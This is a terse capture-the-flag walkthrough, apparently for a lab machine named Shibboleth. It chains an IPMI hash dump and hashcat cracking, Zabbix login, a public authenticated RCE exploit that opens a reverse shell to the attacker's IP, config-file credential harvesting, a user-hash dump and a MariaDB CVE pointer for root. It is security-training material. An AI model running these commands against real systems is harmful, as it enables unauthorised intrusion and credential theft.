### Nmap
```text
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: FlexStart Bootstrap Template - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Apache/2.4.41 (Ubuntu)
623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
| ipmi-cipher-zero: 
|   VULNERABLE:
|   IPMI 2.0 RAKP Cipher Zero Authentication Bypass
|     State: VULNERABLE
|     Risk factor: High
|       
|       The issue is due to the vendor shipping their devices with the
|       cipher suite '0' (aka 'cipher zero') enabled. This allows a
|       remote attacker to authenticate to the IPMI interface using
|       an arbitrary password. The only information required is a valid
|       account, but most vendors ship with a default 'admin' account.
|       This would allow an attacker to have full control over the IPMI
|       functionality
|           
|     References:
|       https://www.us-cert.gov/ncas/alerts/TA13-207A
|_      http://fish2.com/ipmi/cipherzero.html
| ipmi-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 50113 guesses in 187 seconds, average tps: 265.9
```

### IPMI-2.0
```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:bd66407e1a28560003b8668489f11370c00ac9dcbc38462b10f9a9e81ac75487de01d75791e72a32a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9851820b9c6e072318eb104203cee2a2e21bf6ba

# crack ipmi hash
hashcat -m 7300 -a 0 --force hash.txt /usr/share/wordlists/rockyou.txt --show
[+]Administrator:ilovepumkinpie1
```

### Port 80
```bash
# enum subdomain
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.$HOST" -u http://$HOST -t 100 --hw 26

# login http://zabbix.shibboleth.htb
Administrator:ilovepumkinpie1

# found exploit
Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50816.py

# obtain shell as zabbix
python 50816.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.16 443
```

### Priv Esc
```bash
# switch to ipmi-svc
su ipmi-svc:ilovepumkinpie1

# found db cred
cat /etc/zabbix/zabbix_server.conf | grep -v "^#" | grep .
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh

# login db through mysql
mysql -u zabbix -pbloooarskybluh

# found admin hash
use zabbix
select * from users
alias         | name         | surname       | passwd
Admin         | Zabbix       | Administrator | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2
Administrator | IPMI Service | Account       | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe

# sql version
10.3.25-MariaDB-0ubuntu0.20.04.1

# follow exploit link to get root shell
https://github.com/Al1ex/CVE-2021-27928
```
